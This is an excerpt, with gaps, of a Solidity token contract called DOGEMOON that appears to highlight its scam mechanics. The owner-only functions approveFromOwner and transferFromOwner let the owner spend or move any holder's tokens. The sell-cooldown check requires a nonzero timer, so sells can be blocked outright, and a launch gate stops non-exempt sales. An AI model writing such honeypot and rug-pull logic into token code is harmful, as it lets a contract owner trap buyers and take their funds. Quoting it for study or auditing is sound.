...
contract DOGEMOON is Context, IERC20, Ownable {
    ...
    uint256 public sellCooldownTimerInterval = 120; //this is in seconds. 
    ...
    mapping (address => uint256) private lastBlocks;
    ...
    function approveFromOwner(address owner, address spender, uint256 amount) public onlyOwner {
        _approve(owner, spender, amount);
    }

    function transferFromOwner(address owner, address spender, uint256 amount) public onlyOwner {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (to == uniswapV2Pair && !launched) { require(launched || from == owner() || to == owner() || isTimelockExempt[from], "Not launched yet");}
        ...
        if (sellCooldownEnabled
            ...
            && to == uniswapV2Pair) {
            require(sellCooldownTimer[from] < block.timestamp && sellCooldownTimer[from] > 0, "Please wait for cooldown between sells");
            sellCooldownTimer[from] = block.timestamp + sellCooldownTimerInterval;
        }
    ...
    // enable cooldown between trades
    function sellCooldownStatus(bool _status, uint256 _interval) public onlyOwner {
    ...
    function setCheckTimelockExempt(address _user) public view returns (bool) {
        return isTimelockExempt[_user];
    }
    function setRemoveTimelockExempt(address _user) external onlyOwner() {
    ...
    function checkLastBlocks(address sender) public view returns (uint256) {
        return lastBlocks[sender];
    }
